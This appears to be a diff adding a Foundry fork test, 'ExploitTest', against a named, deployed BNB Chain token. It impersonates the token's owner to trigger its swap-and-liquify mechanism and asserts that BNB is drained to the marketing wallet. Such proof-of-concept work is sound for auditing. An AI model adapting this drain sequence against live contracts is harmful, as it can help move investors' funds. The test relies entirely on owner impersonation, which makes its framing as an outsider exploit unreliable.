@@ -1,0 +1,141 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IUniswapV2Router01 {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
+interface IUniswapV2Router02 is IUniswapV2Router01 {}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IElonAllyToken {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function setSwapAndLiquifyEnabled(bool _enabled) external;
+    function excludeFromFee(address account) external;
+    function marketingAddress() external view returns (address payable);
+    function uniswapV2Pair() external view returns (address); // not in ABI but we can compute
+    function deadAddress() external view returns (address);
+    function minimumTokensBeforeSwapAmount() external view returns (uint256);
+    function swapAndLiquifyEnabled() external view returns (bool);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract on BSC
+    address constant TOKEN = 0x41bEC9e10A5bb2F2BBaece4e9491466930874C88;
+    // PancakeSwap Router on BSC
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    // Marketing address as per source
+    address payable constant MARKETING = payable(0x23FAb845BA899e5B1e16447e53A6A47fD87d8a95);
+    // WBNB on BSC
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+    IElonAllyToken token = IElonAllyToken(TOKEN);
+    IUniswapV2Router02 router = IUniswapV2Router02(ROUTER);
+    IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
+
+    address pair;
+    address owner;
+
+    function setUp() public {
+        // Label addresses
+        vm.label(TOKEN, "ElonAllyToken");
+        vm.label(ROUTER, "PancakeRouter");
+        vm.label(MARKETING, "Marketing");
+        vm.label(WBNB, "WBNB");
+
+        // Get owner of token contract
+        owner = token.owner();
+        vm.label(owner, "Owner");
+
+        // Compute the pair address
+        pair = factory.getPair(TOKEN, router.WETH());
+        vm.label(pair, "Pair");
+
+        // Ensure we have some ETH for the owner
+        deal(owner, 100 ether);
+        // Also give the test contract some ETH for gas (not necessary if owner is impersonated)
+        // Give marketing some initial balance to compare
+        vm.deal(MARKETING, 0);
+    }
+
+    function testDrainLiquidityToMarketing() public {
+        // 1. Owner adds initial liquidity to the pair (simulate normal setup)
+        vm.startPrank(owner);
+
+        // Owner has all tokens initially; approve router
+        uint256 tokenAmount = 500_000_000 * 10**9; // 5e17 tokens (5% of supply)
+        token.approve(ROUTER, tokenAmount);
+
+        uint256 ethAmount = 10 ether;
+        // Add liquidity
+        router.addLiquidityETH{value: ethAmount}(
+            TOKEN,
+            tokenAmount,
+            0,
+            0,
+            owner,
+            block.timestamp
+        );
+
+        // 2. Enable swap-and-liquify (the mechanism that sends ETH to marketing)
+        //    But first exclude owner from fee so transfers don't get taxed
+        //    (not strictly needed but cleaner)
+        token.excludeFromFee(owner);
+        token.setSwapAndLiquifyEnabled(true);
+        assertTrue(token.swapAndLiquifyEnabled(), "Swap not enabled");
+
+        // 3. Send tokens to the contract itself so it has a balance above the threshold
+        uint256 threshold = token.minimumTokensBeforeSwapAmount();
+        uint256 sendToContract = threshold * 2; // 400000 * 10**6 * 10**9
+        token.transfer(TOKEN, sendToContract);
+        uint256 contractBalance = token.balanceOf(TOKEN);
+        assertGe(contractBalance, threshold, "Contract balance below threshold");
+
+        // 4. Trigger a sell to the pair – this will invoke _transfer with to==pair,
+        //    which will then call swapTokens() -> sell contract's tokens -> send ETH to marketing
+        //    We sell a trivial amount from owner to the pair
+        uint256 smallSell = 1000 * 10**9; // 1000 tokens
+        token.transfer(pair, smallSell);
+
+        vm.stopPrank();
+
+        // 5. Assert marketing address has received ETH
+        uint256 marketingBalanceAfter = MARKETING.balance;
+        assertGt(marketingBalanceAfter, 0, "Marketing did not receive ETH");
+
+        // Optionally check that the contract's token balance decreased
+        uint256 contractBalanceAfter = token.balanceOf(TOKEN);
+        // It should be less than before because the contract swapped `threshold` tokens
+        assertLt(contractBalanceAfter, contractBalance, "Contract balance not decreased");
+
+        // The marketing address could have obtained a significant amount of ETH
+        // Because the contract sold tokens directly for ETH and sent to marketing
+        console.log("Marketing ETH balance after drain:", marketingBalanceAfter);
+    }
+}
+```
